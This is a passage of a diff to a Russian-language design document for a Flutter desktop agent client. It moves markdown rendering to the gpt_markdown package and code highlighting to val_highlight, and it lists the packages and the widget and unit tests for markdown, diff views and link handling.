+  созданные один раз; импорт пакета — только из `codelab_ui/lib/src/rendering/` (сторож), чтобы
+  замена пакета оставалась локальной. Цена — 12 новых пакетов в графе (среди них `material_ui`
+  и `cupertino_ui`, импорт которых в наш код запрещён сторожем) и возможное расхождение вида
+  ответа с CLI, где разбор свой (change `add-cli-markdown`). Строка ответа не виртуализирует
+  длинный ответ внутри себя — при просадке на ответах в сотни блоков вопрос возвращается.
+  **Отклонённая альтернатива** — прежняя редакция этого раздела: строка ленты на каждый блок
+  markdown, общий AST `MarkdownDocument` из kit (§12.1.4) и свой рендерер блоков в `TextSpan` и
+  `Table` на теме Fluent с подсветкой `re_highlight`. Она давала общий разбор с CLI и
+  виртуализацию длинных ответов, но требовала нескольких сотен строк разбора и отрисовки своими
+  силами.
 * **Подсветка — в `codelab_ui`, токены — простые данные.** Подсветка нужна только графическому
-  клиенту. Если CLI (§12.2) захочет ту же токенизацию для ANSI, токенизатор переносится в kit
-  без изменения API `AcpCodeHighlighter`.
+  клиенту. Движок — `val_highlight` (BSD-3-Clause, чистый Dart): он уже приходит с
+  `gpt_markdown`, второй движок только увеличил бы сборку. Он скрыт за `CodeLabCodeHighlighter`;
+  если CLI (§12.2) захочет ту же токенизацию для ANSI, токенизатор переносится в kit без
+  изменения API.
 * **Пороги.** 960 px — ширина, при которой две колонки по 80 моноширинных символов помещаются
   с полями номеров. 300 строк inline — примерно три экрана: дальше diff мешает читать ленту.
   Лимиты вложений консервативны и меняются константами в одном месте. В OpenSpec change их можно
@@ -967,30 +1021,36 @@ R8-3, R8-4; design.md change `add-config-literal-secrets-and-migrate`, D8).** Л
 
 | Пакет | Куда | Зачем | Почему не существующее |
 |---|---|---|---|
-| `re_highlight` | `codelab_ui` | токенизация кода по грамматикам highlight.js, чистый Dart в ядре, работает в `compute` | в проекте нет подсветки; альтернатива на TextMate-грамматиках требует асинхронной загрузки грамматик из assets и тяжелее; собственный токенизатор на десятки языков несоразмерен задаче |
+| `gpt_markdown` (≥ 1.4.1 < 1.5.0) | `codelab_ui` (`lib/src/rendering/`) | разбор и отрисовка markdown ответа со стримингом (кеш сегментов), таблицы, задачи, формулы; решение пользователя 2026-11-11, change `add-desktop-markdown` | своего разбора в проекте нет; свой разбор и отрисовка (прежняя редакция) отклонены после прототипа; `flutter_markdown` прекращён |
+| `val_highlight` | `codelab_ui` (`lib/src/rendering/`) | токенизация кода, чистый Dart, работает в `compute` | приходит с `gpt_markdown`; `re_highlight` (прежний выбор) стал бы вторым движком |
 | `desktop_drop` | app (presentation) | приём файлов, перетаскиваемых из ОС, на macOS, Windows, Linux | Flutter не даёт drop внешних файлов на десктопе; `file_selector` покрывает только диалог |
 | `pasteboard` | app (`core/platform`) | изображения и файлы из системного буфера | `Clipboard` Flutter читает только текст |
-| `url_launcher` | app (`core/platform`) | открытие http/https/mailto по клику | вызов `open`/`xdg-open` через процесс разносит проверки платформ по коду (AGENTS.md §11) |
+| `url_launcher` | app (`core/platform`) | открытие http/https/mailto по клику; принят change `add-desktop-markdown` | вызов `open`/`xdg-open` через процесс разносит проверки платформ по коду (AGENTS.md §11) |
 
 Для каждого пакета перед добавлением нужно проверить: лицензию (политика §7а), активность
 сопровождения, поддержку целевых платформ и отсутствие нативной сборки, ломающей текущий CI
-macOS. Пакет-виджет markdown не добавляется.
+macOS. Для `gpt_markdown`, `val_highlight` и `url_launcher` проверка — задача 1.1 change
+`add-desktop-markdown` (лицензии транзитивных пакетов, шрифты JetBrains Mono и Latin Modern в
+`THIRD_PARTY_NOTICES.md`); `desktop_drop` и `pasteboard` остаются до D-12.
 
 ## 12.3.7. Как проверить
 
 **Widget-тесты `codelab_ui`** (`packages/flutter/codelab_ui/test/`). Для производительности проверяются
-счётчики работы, а не время. Виджеты ведут debug-счётчики `AcpRenderStats.blockBuilds`,
-`highlightRuns` и `highlightSyncRuns`; их значения учитываются только в `assert`.
+счётчики работы, а не время. Виджеты ведут debug-счётчики `CodeLabMarkdownStats.codeBlockBuilds`,
+`headingBuilds`, `highlightRuns` и `highlightSyncRuns`; их значения учитываются только в `assert`.
+Тесты markdown перехватывают сеть (`HttpOverrides`): любой запрос до клика — провал. Полный список
+сценариев — `specs/agent-workbench-ui/spec.md` change `add-desktop-markdown`.
 
 | Файл: тест | Цель |
 |---|---|
 | `acp_markdown_test.dart: renders headings lists tables quotes and inline code` | D-06 |
 | `acp_markdown_test.dart: code block shows language and copy puts raw code into clipboard` | D-06 |
-| `acp_markdown_test.dart: streaming 200 chunks builds each stable block once` (`blockBuilds`) | D-06, DSK-3 |
+| `acp_markdown_test.dart: streaming 200 chunks builds each closed block once` (`codeBlockBuilds`, `headingBuilds`; ответы с тремя блоками кода и 48 КБ) | D-06, DSK-3 |
 | `acp_markdown_test.dart: unclosed fence in tail renders plain and highlights after close` | DSK-6 |
 | `acp_markdown_test.dart: large code block is highlighted off the UI isolate` (`highlightSyncRuns == 0`) | DSK-5 |
 | `acp_markdown_test.dart: link tap calls onOpenLink and non-http schemes are not tappable` | DSK-7 |
-| `acp_markdown_test.dart: markdown image is rendered as link and not fetched` | DSK-7 |
+| `acp_markdown_test.dart: markdown image is not fetched before user action` | DSK-7, VIEW-12 |
+| `codelab_ui/test/rendering/code_highlighter_test.dart`: пороги, LRU, неизвестный язык, контраст палитры | D-06, DSK-5, DSK-19 |
 | `acp_diff_view_test.dart: unified below 960 px and side-by-side at 960 px or wider` | D-07, DSK-8 |
 | `acp_diff_view_test.dart: diff over 300 lines is collapsed and opens full viewer` | D-07, DSK-8 |
 | `acp_diff_view_test.dart: summary normal verbose view modes show line, preview, full` | D-07 |
@@ -1017,7 +1077,10 @@ macOS. Пакет-виджет markdown не добавляется.
 `apps/codelab_desktop/test/core/platform/`):
 
 * `ui_mappers_transcript_test.dart: unchanged kit items map to identical rows` (DSK-4);
-* `ui_mappers_transcript_test.dart: agent text item splits into one row per block with tail flag`;
+* `ui_mappers_test.dart`: ответ агента — одна строка с `streaming` у последнего ответа идущего
+  хода, огороженный ответ — без `unfenceSingleBlock` (change `add-desktop-markdown`, D3, D11);
+* `link_policy_test.dart`: таблица схем ссылок и изображений; `external_link_opener_test.dart` и
+  тест `CodeLabShellCubit.openExternalLink` — повторная проверка схемы, журнал без query (D5, D6);
 * `ui_mappers_transcript_test.dart: spill marker becomes copyable path and is never opened`;
 * `composer_cubit_test.dart: chip view equals plan used by send and is recomputed when promptCapabilities change` (DSK-12);
 * `composer_cubit_test.dart: limits reject eleventh attachment and oversize pasted image` (DSK-14);
